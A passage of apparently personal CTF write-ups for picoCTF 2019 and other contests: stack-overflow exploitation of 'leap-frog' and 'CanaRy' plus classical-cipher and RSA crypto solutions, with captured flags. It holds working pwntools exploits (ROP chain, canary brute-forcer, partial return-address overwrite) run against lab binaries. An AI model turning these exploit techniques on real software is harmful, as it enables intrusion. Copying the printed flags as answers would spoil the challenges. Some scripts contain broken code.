    printf(&quot;Nope. Try a little bit harder.\n&quot;);
  }
}

void leap3() {
  if (win1 &amp;&amp; !win1) {
    win3 = true;
  } else {
    printf(&quot;Nope. Try a little bit harder.\n&quot;);
  }
}

void display_flag() {
  char flag[FLAG_SIZE];
  FILE *file;
  file = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
  if (file == NULL) {
    printf(&quot;'flag.txt' missing in the current directory!\n&quot;);
    exit(0);
  }
  fgets(flag, sizeof(flag), file);
  
  if (win1 &amp;&amp; win2 &amp;&amp; win3) {
    printf(&quot;%s&quot;, flag);
    return;
  } else if (win1 || win3) {
    printf(&quot;Nice Try! You're Getting There!\n&quot;);
  } else {
    printf(&quot;You won't get the flag that easy..\n&quot;);
  }
}

void vuln() {
  char buf[16];
  printf(&quot;Enter your input&gt; &quot;);
  return gets(buf);
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
</code></pre><p>It seems that in order to print the flag we first need to set <code>win1</code>, <code>win2</code>, <code>win3</code> to <code>true</code>, then call <code>display_flag()</code>.<p>There are three corresponding functions which seem to set these booleans, but <code>leap3()</code> has the impossible condition <code>win1 && !win1</code> and we can't jump past that check due to ASLR.<p>What if we just use the <code>gets()</code> function in Libc which is able to write anything from stdin into any writable segment of memory. So we can use <code>gets()</code> to set <code>win1</code>, <code>win2</code>, and <code>win3</code> to true, and skip calling all the <code>leap()</code> functions.<p>We can set all the variables to <code>true</code> with a payload that:<pre><code>- Padding of A's for a Buffer Overflow
- gets_plt - first function to call
- flag_addr - second function to call
- win_addr - the buffer parameter being passed to gets
</code></pre><pre><code class=language-python>from pwn import *
import sys
import subprocess

BINARY = './rop'
context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

if len(sys.argv) &lt; 2:
    stdout = process.PTY
    stdin = process.PTY
    sh = process(BINARY, stdout=stdout, stdin=stdin)
    REMOTE = False
else:
    s = ssh(host='2019shell1.picoctf.com', user='samson', password=&quot;REDACTED&quot;)
    sh = s.process('rop', cwd='/problems/leap-frog')
    REMOTE = True

gets_plt = 0x08048430
win1_addr = 0x0804A03D
display_flag_addr = 0x080486b3
payload = 'A'*28
payload += p32(gets_plt)
payload += p32(display_flag_addr)
payload += p32(win1_addr)
sh.sendlineafter('&gt; ', payload)
sh.sendline('\x01\x01\x01')
sh.interactive()
</code></pre><pre><code class=language-bash>samson@pico-2019-shell1:/problems/leap-frog$ python ~/test2.py 
[*] '/problems/leap-frog/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './rop': pid 3016256
[*] Switching to interactive mode
picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_f60266f9}
[*] Got EOF while reading in interactive
</code></pre><h2><a class=header href=#flag-11 id=flag-11>Flag</a></h2><p><code>picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_f60266f9}</code><h1><a class=header href=#picoctf19-canary id=picoctf19-canary>PicoCTF19 CanaRy</a></h1><h2><a class=header href=#challenge-12 id=challenge-12>Challenge</a></h2><p>This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this <a href=https://2019shell1.picoctf.com/static/6811022be7c0f9b08826d5cdcc20a2bf/vuln>program</a> located in /problems/canary_3. <a href=https://2019shell1.picoctf.com/static/6811022be7c0f9b08826d5cdcc20a2bf/vuln.c>Source</a>.<h2><a class=header href=#hints-12 id=hints-12>Hints</a></h2><p>Maybe there's a smart way to brute-force the canary?<h2><a class=header href=#solution-12 id=solution-12>Solution</a></h2><p>In this question, we have an additional file in our directory:<pre><code>samson@pico-2019-shell1:/problems/canary_3$ ls -al
total 96
drwxr-xr-x   2 root       root        4096 Sep 28  2019 .
drwxr-x--x 684 root       root       69632 Oct 10  2019 ..
-r--r-----   1 hacksports canary_3       5 Sep 28  2019 canary.txt
-r--r-----   1 hacksports canary_3      42 Sep 28  2019 flag.txt
-rwxr-sr-x   1 hacksports canary_3    7744 Sep 28  2019 vuln
-rw-rw-r--   1 hacksports hacksports  1469 Sep 28  2019 vuln.c
</code></pre><p>Here's the file<pre><code class=language-c>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;wchar.h&gt;
#include &lt;locale.h&gt;

#define BUF_SIZE 32
#define FLAG_LEN 64
#define KEY_LEN 4

void display_flag() {
  char buf[FLAG_LEN];
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;'flag.txt' missing in the current directory!\n&quot;);
    exit(0);
  }
  fgets(buf,FLAG_LEN,f);
  puts(buf);
  fflush(stdout);
}

char key[KEY_LEN];
void read_canary() {
  FILE *f = fopen(&quot;/problems/canary_3/canary.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;[ERROR]: Trying to Read Canary\n&quot;);
    exit(0);
  }
  fread(key,sizeof(char),KEY_LEN,f);
  fclose(f);
}

void vuln(){
   char canary[KEY_LEN];
   char buf[BUF_SIZE];
   char user_len[BUF_SIZE];

   int count;
   int x = 0;
   memcpy(canary,key,KEY_LEN);
   printf(&quot;Please enter the length of the entry:\n&gt; &quot;);

   while (x&lt;BUF_SIZE) {
      read(0,user_len+x,1);
      if (user_len[x]=='\n') break;
      x++;
   }
   sscanf(user_len,&quot;%d&quot;,&amp;count);

   printf(&quot;Input&gt; &quot;);
   read(0,buf,count);

   if (memcmp(canary,key,KEY_LEN)) {
      printf(&quot;*** Stack Smashing Detected *** : Canary Value Corrupt!\n&quot;);
      exit(-1);
   }
   printf(&quot;Ok... Now Where's the Flag?\n&quot;);
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  read_canary();
  vuln();

  return 0;
}
</code></pre><p>Let's also run our sanity checks for protections applied:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/canary_3$ checksec vuln
[*] '/problems/canary_3/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled (ASLR)
</code></pre><p>For context, a canary is just a value on the stack between local variables and function return addresses.<p>They are used to mitigate against buffer overflow attacks by verifying that this value is always on the stack to verify the stack has not been "smashed" or compromised.<p>This is usually added by the compiler with a flag, but for illustrative purposes the problem seems to implement an application version of the canary.<hr><p>So at the start of the program, it seems the the program loads the canary of size 4 bytes into a global variable of type char.<pre><code>#define KEY_LEN 4
char key[KEY_LEN];
void read_canary() {
  FILE *f = fopen(&quot;/problems/canary_3/canary.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;[ERROR]: Trying to Read Canary\n&quot;);
    exit(0);
  }
  fread(key,sizeof(char),KEY_LEN,f);
  fclose(f);
}
</code></pre><p>If we were able to read <code>canary.txt</code> (which we can't), we would know what to fill our buffer overflow with, however we don't. On the other hand, due to this function we know it's constant.<p>Fun Fact: Windows XP used to use a constant canary and you could brute-force it byte by byte. This may be the solution here.<pre><code class=language-c>   char canary[KEY_LEN];
   char buf[BUF_SIZE];
   char user_len[BUF_SIZE];

   int count;
   int x = 0;
   memcpy(canary,key,KEY_LEN);
   printf(&quot;Please enter the length of the entry:\n&gt; &quot;);

   while (x&lt;BUF_SIZE) {
      read(0,user_len+x,1);
      if (user_len[x]=='\n') break;
      x++;
   }
   sscanf(user_len,&quot;%d&quot;,&amp;count);
</code></pre><p>The program prompts us for the length of the entry, not sure what that is yet. But it reads from user input and places it into a buffer <code>user_len</code>.<p>Then it reads the input we pass it with a vulnerable function, but it reads only the amount we said we'd send it.<p><code>read(0,buf,count);</code><pre><code>samson@pico-2019-shell1:/problems/canary_3$ ./vulnPlease enter the length of the entry:
&gt; 0
Input&gt; Ok... Now Where's the Flag?
samson@pico-2019-shell1:/problems/canary_3$ ./vuln
Please enter the length of the entry:
&gt; 1
Input&gt; 1
Ok... Now Where's the Flag?
samson@pico-2019-shell1:/problems/canary_3$ ./vuln
Please enter the length of the entry:
&gt; 64
Input&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** Stack Smashing Detected *** : Canary Value Corrupt!
</code></pre><p>At this point, we sort of know what we have to do. We have to bruteforce the canary which is 4 bytes, then overwrite the first return address with the address of the <code>display_flag()</code> function.<p>We will attempt to attack the canary one value at a time, let's create our python script to do this for us.<pre><code class=language-python>#!/usr/bin/env python

from pwn import *

s = ssh(host = '2019shell1.picoctf.com', user='samson', password='REDACTED')

canary = ''
while len(canary) &lt; 4: # Only 1024 iterations, possible because of 32bit
    for i in range(256): # from 00 to FF in each byte
        p = s.process('/problems/canary_3/vuln')
        p.sendlineafter('&gt; ', '{}'.format(32 + len(canary) + 1)) # BUF_SIZE + 1 intending to write past canary
        p.sendlineafter('&gt; ', 'A' * 32 + canary + '{}'.format(chr(i)))
        l = p.recvline()

        if '*** Stack Smashing Detected' not in str(l):
            canary += chr(i)
            log.info('Partial canary: {}'.format(canary))
            break

        p.close()
log.info('Found canary: {}'.format(canary))
</code></pre><pre><code class=language-bash>$ python canary.py 
...
[*] Partial canary: 57Gh
[*] Found canary: 57Gh
</code></pre><p>Great we have the canary: <code>57Gh</code><p>However, it's not as simple as the usual buffer overflow now. since PIE or ASLR is enabled, the address of <code>display_flag()</code> is randomized.<p>Let's check the value once:<pre><code>samson@pico-2019-shell1:/problems/canary_3$ gdb ./vuln 
(gdb) b main
Breakpoint 1 at 0xa14
(gdb) run
Starting program: /problems/canary_3/vuln 

Breakpoint 1, 0x56586a14 in main ()
(gdb) x display_flag
0x565867ed &lt;display_flag&gt;:      0x53e58955
-----------------
samson@pico-2019-shell1:/problems/canary_3$ gdb ./vuln 
(gdb) x display_flag
0x7ed &lt;display_flag&gt;:   0x53e58955
(gdb) b main
Breakpoint 1 at 0xa14
(gdb) r
Starting program: /problems/canary_3/vuln 

Breakpoint 1, 0x565cfa14 in main ()
(gdb) x display_flag
0x565cf7ed &lt;display_flag&gt;:      0x53e58955
</code></pre><p>Interestingly enough, for some reason if you try this over and over again, the addresses seem to repeat. Only 3 bytes.
Let's brute force it? We can attempt to use one of the addresses and hope there will a chance it'll work.<p>Again, this will only work since we're in 32-bit mode, even more so since only a few of the 32 bits are random.<p>Let's construct our payload:<pre><code>payload = &quot;A&quot;*32 + canary + &quot;A&quot;*16 + &quot;\xed\x07&quot;
</code></pre><p>We can determine the offset from the canary to the bottom of the stack but looking at the assembly code for the offset to the frame pointer, trail and error with multiples of 4, or even using the pwntools cyclic command.<p>In this case, I'll use GDB for brevity, remember that we're looking for <code>ebp</code> when looking for clues of an offset. 0x10 is 16 bytes.<pre><code>(gdb) disas vuln
Dump of assembler code for function vuln:
   0x000008f4 &lt;+0&gt;:     push   %ebp
   0x000008f5 &lt;+1&gt;:     mov    %esp,%ebp
   0x000008f7 &lt;+3&gt;:     push   %ebx
   0x000008f8 &lt;+4&gt;:     sub    $0x54,%esp
   0x000008fb &lt;+7&gt;:     call   0x6f0 &lt;__x86.get_pc_thunk.bx&gt;
   0x00000900 &lt;+12&gt;:    add    $0x16a0,%ebx
   0x00000906 &lt;+18&gt;:    movl   $0x0,-0xc(%ebp)
   0x0000090d &lt;+25&gt;:    lea    0x6c(%ebx),%eax
   0x00000913 &lt;+31&gt;:    mov    (%eax),%eax
   0x00000915 &lt;+33&gt;:    mov    %eax,-0x10(%ebp)    &lt;&lt;&lt;&lt;
   0x00000918 &lt;+36&gt;:    sub    $0xc,%esp
   0x0000091b &lt;+39&gt;:    lea    -0x1414(%ebx),%eax
</code></pre><p>Now we can code our exploit with our known canary:<pre><code class=language-python>#!/usr/bin/env python

from pwn import *

s = ssh(host = '2019shell1.picoctf.com', user='samson', password='REDACTED')
s.set_working_directory('/problems/canary_3/')
canary = &quot;57Gh&quot;
address_display_flag = 0x565cf7ed
while True:
    p = s.process('./vuln')
    p.sendlineafter('&gt; ', '54') # Size of payload
    payload = &quot;A&quot;*32 + canary + &quot;A&quot;*16 + &quot;\xed\x07&quot;
    p.sendlineafter('&gt; ', payload)
    out = p.recvall()
    print(out)
    if &quot;pico&quot; in str(out):
        print(out)
        break
    p.close()
</code></pre><pre><code>samson@pico-2019-shell1:/problems/canary_3$ python ~/p2.py 
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[!] Couldn't check security settings on '2019shell1.picoctf.com'
[*] Working directory: '/problems/canary_3/'
[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174334
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174334)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174341
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174341)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174348
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174348)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174355
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174355)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174362
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174362)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174369
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174369)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174376
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174376)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174384
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174384)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174391
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174391)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174398
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174398)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174405
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174405)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174412
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174412)
Ok... Now Where's the Flag?

[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1174419
[+] Receiving all data: Done (71B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1174419)
Ok... Now Where's the Flag?
picoCTF{cAnAr135_mU5t_b3_r4nd0m!_0bd260ce}

Ok... Now Where's the Flag?
picoCTF{cAnAr135_mU5t_b3_r4nd0m!_0bd260ce}
</code></pre><h2><a class=header href=#flag-12 id=flag-12>Flag</a></h2><p><code>picoCTF{cAnAr135_mU5t_b3_r4nd0m!_0bd260ce}</code><h1><a class=header href=#crypto-2 id=crypto-2>Crypto</a></h1><p>Placeholder for crypto resources<h1><a class=header href=#hackcon2018-caesar-salad id=hackcon2018-caesar-salad>Hackcon2018 Caesar Salad</a></h1><pre><code>Can you toss Caesar's salad?

q4ex{tlg_thq_p4rf4e}p0qr
</code></pre><hr><pre><code class=language-bash>$ echo &quot;q4ex{tlg_thq_p4rf4e}p0qr&quot; | rot13
d4rk{g1t_gud_c4es4r}c0de
</code></pre><h1><a class=header href=#hackcon2018-salad-upgrades id=hackcon2018-salad-upgrades>Hackcon2018 Salad Upgrades</a></h1><pre><code>Sure, I could toss them all using just one shift. But am I gonna?

CIPHERTEXT: e4uo{zo1b_1e_f0j4l10i}z0ce
</code></pre><hr><p>Attempt Caesar<pre><code class=language-bash>$ for i in {1..26}; do echo &quot;e4uo{zo1b_1e_f0j4l10i}z0ce&quot; | caesar $i; done
f4vp{ap1c_1f_g0k4m10j}a0df
g4wq{bq1d_1g_h0l4n10k}b0eg
h4xr{cr1e_1h_i0m4o10l}c0fh
i4ys{ds1f_1i_j0n4p10m}d0gi
j4zt{et1g_1j_k0o4q10n}e0hj
k4au{fu1h_1k_l0p4r10o}f0ik
l4bv{gv1i_1l_m0q4s10p}g0jl
m4cw{hw1j_1m_n0r4t10q}h0km
n4dx{ix1k_1n_o0s4u10r}i0ln
o4ey{jy1l_1o_p0t4v10s}j0mo
p4fz{kz1m_1p_q0u4w10t}k0np
q4ga{la1n_1q_r0v4x10u}l0oq
r4hb{mb1o_1r_s0w4y10v}m0pr
s4ic{nc1p_1s_t0x4z10w}n0qs
t4jd{od1q_1t_u0y4a10x}o0rt
u4ke{pe1r_1u_v0z4b10y}p0su
v4lf{qf1s_1v_w0a4c10z}q0tv
w4mg{rg1t_1w_x0b4d10a}r0uw
x4nh{sh1u_1x_y0c4e10b}s0vx
y4oi{ti1v_1y_z0d4f10c}t0wy
z4pj{uj1w_1z_a0e4g10d}u0xz
a4qk{vk1x_1a_b0f4h10e}v0ya
b4rl{wl1y_1b_c0g4i10f}w0zb
c4sm{xm1z_1c_d0h4j10g}x0ac
d4tn{yn1a_1d_e0i4k10h}y0bd
e4uo{zo1b_1e_f0j4l10i}z0ce
</code></pre><p>None match the flag format. Try Vignere Cipher.
Hint being "not just one shift"<pre><code class=language-python>import string
import collections


cipher = 'e4uo{zo1b_1e_f0j4l10i}z0ce'

# key 12345...

result = ''
i = 1


for char in cipher:
    lowercase = collections.deque(string.lowercase)
    if char not in string.digits and char != '{' and char != '}' and char != '_':
        cipher_index = string.lowercase.index(char)
        lowercase.rotate(i)
        result += lowercase[cipher_index]
    else:
        result += char
    i += 1

print(result)
</code></pre><h1><a class=header href=#icectf18q-garfield id=icectf18q-garfield>IceCTF18Q Garfield</a></h1><p><img src=ctf/crypto/assets/garfeld.png alt=Garfeld.png title=Garfeld.png><pre><code>IjgJUO{P_LOUV_AIRUS_GYQUTOLTD_SKRFB_TWNKCFT}
07271978
</code></pre><p>are found in the picture<p>Note:<p><code>IjgJUO{P_LOUV_AIRUS_GYQUTOLTD_SKRFB_TWNKCFT}</code> -> seems to be the flag
<code>I + 0 = I</code>, <code>j - 7 = c</code>, <code>g - 2 = e</code> .... seee a pattern?<p><code>Garfield</code> is spelt as <code>Garfeld</code><pre><code class=language-python>#!/usr/bin/env python
numbers = '07271978'
flag =[]
with open(&quot;message.txt&quot;) as handle:
    message = handle.read()
    counter = 0
    for c in message:
        c = c.upper()

        if (c in uppercase):
            index = uppercase.index(c)
            offset = int(numbers[counter % len(numbers)])
            new_char = uppercase[index - offset]
            flag.append(new_c)
            counter += 1
        else:
            flag.append(character)
print ''.join(flag)
</code></pre><p>ICECTF{I_DONT_THINK_GRONSFELD_LIKES_MONDAYS}<h1><a class=header href=#tjctf18-classic id=tjctf18-classic>TJCTF18 Classic</a></h1><h2><a class=header href=#challenge-13 id=challenge-13>Challenge</a></h2><p>My primes might be close in size but they're big enough that it shouldn't matter right?<p><code>rsa.txt</code><pre><code>e = 65537
n = 128299637852747781491257187842028484364103855748297296704808405762229741626342194440837748106022068295635777844830831811978557490708404900063082674039252789841829590381008343327258960595508204744589399243877556198799438322881052857422197506822302290812621883700357890208069551876513290323124813780520689585503
c = 43160414063424128744492209010823042660025171642991046645158489731385945722740307002278661617111192557638773493117905684302084789590107080892369738949935010170735247383608959796206619491522997896941432858113478736544386518678449541064813172833593755715667806740002726487780692635238838746604939551393627585159
</code></pre><h2><a class=header href=#solution-13 id=solution-13>Solution</a></h2><p>Probably called classic because it's classic RSA.<pre><code>E is the exponent
N is the modulus
C is the ciphertext
</code></pre><p>Attempt to find primes:<pre><code>http://factordb.com/index.php?query=128299637852747781491257187842028484364103855748297296704808405762229741626342194440837748106022068295635777844830831811978557490708404900063082674039252789841829590381008343327258960595508204744589399243877556198799438322881052857422197506822302290812621883700357890208069551876513290323124813780520689585503&amp;use=n&amp;n=1&amp;VP=on&amp;VC=on&amp;EV=on&amp;OD=on&amp;PR=on&amp;FF=on&amp;PRP=on&amp;CF=on&amp;U=on&amp;C=on&amp;perpage=20&amp;format=1
</code></pre><p>Factors found! Otherwise, would have to look here: https://alpertron.com.ar/ECM.HTM<pre><code>p = 11326943005628119672694629821649856331564947811949928186125208046290130000912120768861173564277210907403841603312764378561200102283658817695884193223692869
q = 11326943005628119672694629821649856331564947811949928186125208046290130000912216246378177299696220728414241927034282796937320547048361486068608744598351187
</code></pre><pre><code class=language-python>#!/usr/bin/env python

from Crypto.Util.number import inverse

e = 65537
n = 128299637852747781491257187842028484364103855748297296704808405762229741626342194440837748106022068295635777844830831811978557490708404900063082674039252789841829590381008343327258960595508204744589399243877556198799438322881052857422197506822302290812621883700357890208069551876513290323124813780520689585503
c = 43160414063424128744492209010823042660025171642991046645158489731385945722740307002278661617111192557638773493117905684302084789590107080892369738949935010170735247383608959796206619491522997896941432858113478736544386518678449541064813172833593755715667806740002726487780692635238838746604939551393627585159
p = 11326943005628119672694629821649856331564947811949928186125208046290130000912120768861173564277210907403841603312764378561200102283658817695884193223692869
q = 11326943005628119672694629821649856331564947811949928186125208046290130000912216246378177299696220728414241927034282796937320547048361486068608744598351187

phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c, d, n)
print(hex(m)[2:-1].decode('hex'))
</code></pre><h2><a class=header href=#flag-13 id=flag-13>Flag</a></h2><p><code>tjctf{1_l1ke_squares}</code><h1><a class=header href=#picoctf19-the-numbers id=picoctf19-the-numbers>PicoCTF19 The Numbers</a></h1><h2><a class=header href=#challenge-14 id=challenge-14>Challenge</a></h2><p>The <a href=https://2019shell1.picoctf.com/static/880cb722e666005093d6c2c5751ec042/the_numbers.png>numbers</a>... what do they mean?<p><img src=ctf/crypto/assets/the_numbers.png alt=the_numbers.png title=the_numbers.png><h2><a class=header href=#hint id=hint>Hint</a></h2><p>The flag is in the format PICOCTF{}<h2><a class=header href=#solution-14 id=solution-14>Solution</a></h2><p>This looks like the Letter Number Cipher (known as A1Z26):<p>Use <a href=https://www.dcode.fr/letter-number-cipher>this</a> to decode the message.<pre><code>16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }
</code></pre><h3><a class=header href=#flag-14 id=flag-14>Flag</a></h3><p><code>PICOCTF{THENUMBERSMASON}</code><h1><a class=header href=#picoctf19-caesar id=picoctf19-caesar>PicoCTF19 Caesar</a></h1><h2><a class=header href=#challenge-15 id=challenge-15>Challenge</a></h2><p>Decrypt this <a href=https://2019shell1.picoctf.com/static/dd13c821b22c2f3bd7ea8825ff733cc1/ciphertext>message</a>. You can find the ciphertext in /problems/caesar_5_d706b250ed3c6d2d2c72155de301a2f1 on the shell server.<p><code>picoCTF{dspttjohuifsvcjdpobqjtwtvk}</code><h3><a class=header href=#hints-13 id=hints-13>Hints</a></h3><p>caesar cipher <a href=https://learncryptography.com/classical-encryption/caesar-cipher>tutorial</a><h2><a class=header href=#solution-15 id=solution-15>Solution</a></h2><p>There's only 26 possibilities for a Caesar cipher. There probably exists a tool online somewhere.<p><a href=https://cryptii.com/pipes/caesar-cipher>https://cryptii.com/pipes/caesar-cipher</a><p>Since the <code>picoCTF</code> isn't part of the flag, there's no way of knowing which substitution is correct so lets click through hoping to see some English.<p>Success on +25<h3><a class=header href=#flag-15 id=flag-15>Flag</a></h3><p><code>picoCTF{crossingtherubiconapisvsuj}</code><h1><a class=header href=#picoctf19-waves-lambda id=picoctf19-waves-lambda>PicoCTF19 Waves Lambda</a></h1><h2><a class=header href=#challenge-16 id=challenge-16>Challenge</a></h2><p>We made alot of substitutions to encrypt this. Can you decrypt it? Connect with <code>nc 2019shell1.picoctf.com 32282</code>.<h3><a class=header href=#hints-14 id=hints-14>Hints</a></h3><p>Flag is not in the usual flag format<h2><a class=header href=#solution-16 id=solution-16>Solution</a></h2><pre><code class=language-bash>$ nc 2019shell1.picoctf.com 32282
-------------------------------------------------------------------------------
qsfaoimw bpop xw ysco dkia - dopzcpfqy_xw_q_supo_kithei_jmmbmmshcq
-------------------------------------------------------------------------------
hpmlppf cw mbpop liw, iw x biup ikopiey wixe wstplbpop, mbp hsfe sd mbp wpi. hpwxepw bskexfa sco bpiomw msapmbpo mboscab ksfa jpoxsew sd wpjioimxsf, xm bie mbp pddpqm sd tinxfa cw mskpoifm sd piqb smbpo'w yiofwife pupf qsfuxqmxsfw. mbp kilypombp hpwm sd ske dpkkslwbie, hpqicwp sd bxw tify ypiow ife tify uxomcpw, mbp sfky qcwbxsf sf epqn, ife liw kyxfa sf mbp sfky oca. mbp iqqscfmifm bie hoscabm scm ikopiey i hsg sd estxfspw, ife liw msyxfa ioqbxmpqmcoikky lxmb mbp hsfpw. tioksl wim qosww-kpaape oxabm idm, kpifxfa iaixfwm mbp txvvpf-tiwm. bp bie wcfnpf qbppnw, i ypkksl qstjkpgxsf, i wmoixabm hiqn, if iwqpmxq iwjpqm, ife, lxmb bxw iotw eosjjpe, mbp jiktw sd bifew scmlioew, opwpthkpe if xesk. mbp exopqmso, wimxwdxpe mbp ifqbso bie asse bske, tiep bxw liy idm ife wim eslf itsfawm cw. lp pgqbifape i dpl lsoew kivxky. idmpolioew mbpop liw wxkpfqp sf hsioe mbp yiqbm. dso wstp opiwsf so smbpo lp exe fsm hpaxf mbim aitp sd estxfspw. lp dpkm tpexmimxup, ife dxm dso fsmbxfa hcm jkiqxe wmioxfa. mbp eiy liw pfexfa xf i wpopfxmy sd wmxkk ife pgzcxwxmp hoxkkxifqp. mbp limpo wbsfp jiqxdxqikky; mbp wny, lxmbscm i wjpqn, liw i hpfxaf xttpfwxmy sd cfwmixfpe kxabm; mbp upoy txwm sf mbp pwwpg tiowb liw kxnp i aicvy ife oiexifm dihoxq, bcfa dost mbp lssepe oxwpw xfkife, ife eoijxfa mbp ksl wbsopw xf exijbifscw dskew. sfky mbp aksst ms mbp lpwm, hossexfa supo mbp cjjpo opiqbpw, hpqitp tsop wsthop pupoy txfcmp, iw xd ifapope hy mbp ijjosiqb sd mbp wcf.
</code></pre><p>Seems to be some sort of email or letter. Could be any cipher. Let's try our tools:
<a href=https://www.guballa.de/substitution-solver>https://www.guballa.de/substitution-solver</a><pre><code>-------------------------------------------------------------------------------
congrats here is your flag - frequency_is_c_over_lambda_ptthttobuc
-------------------------------------------------------------------------------
between us there was, as i have already said somewhere, the bond of the sea. besides holding our hearts together through long periods of separation, it had the effect of making us tolerant of each other's yarnsand even convictions. the lawyerthe best of old fellowshad, because of his many years and many virtues, the only cushion on deck, and was lying on the only rug. the accountant had brought out already a box of dominoes, and was toying architecturally with the bones. marlow sat cross-legged right aft, leaning against the mizzen-mast. he had sunken cheeks, a yellow complexion, a straight back, an ascetic aspect, and, with his arms dropped, the palms of hands outwards, resembled an idol. the director, satisfied the anchor had good hold, made his way aft and sat down amongst us. we exchanged a few words lazily. afterwards there was silence on board the yacht. for some reason or other we did not begin that game of dominoes. we felt meditative, and fit for nothing but placid staring. the day was ending in a serenity of still and exquisite brilliance. the water shone pacifically; the sky, without a speck, was a benign immensity of unstained light; the very mist on the essex marsh was like a gauzy and radiant fabric, hung from the wooded rises inland, and draping the low shores in diaphanous folds. only the gloom to the west, brooding over the upper reaches, became more sombre every minute, as if angered by the approach of the sun.
</code></pre><h3><a class=header href=#flag-16 id=flag-16>Flag</a></h3><p><code>picoCTF{frequency_is_c_over_lambda_ptthttobuc}</code><h1><a class=header href=#picoctf19-la-cifra-de id=picoctf19-la-cifra-de>PicoCTF19 La Cifra De</a></h1><h2><a class=header href=#challenge-17 id=challenge-17>Challenge</a></h2><p>I found this cipher in an old book. Can you figure out what it says? Connect with 'nc 2019shell1.picoctf.com 12254'.<h3><a class=header href=#hints-15 id=hints-15>Hints</a></h3><p>There are tools that make this easy.<p>Perhaps looking at history will help<h2><a class=header href=#solution-17 id=solution-17>Solution</a></h2><pre><code class=language-bash>$ nc 2019shell1.picoctf.com 12254
Encrypted message:
﻿Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltk

Ifrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjd

Iz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo

Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK{m311a50_0x_a1rn3x3_h1ah3xf653pdkh}

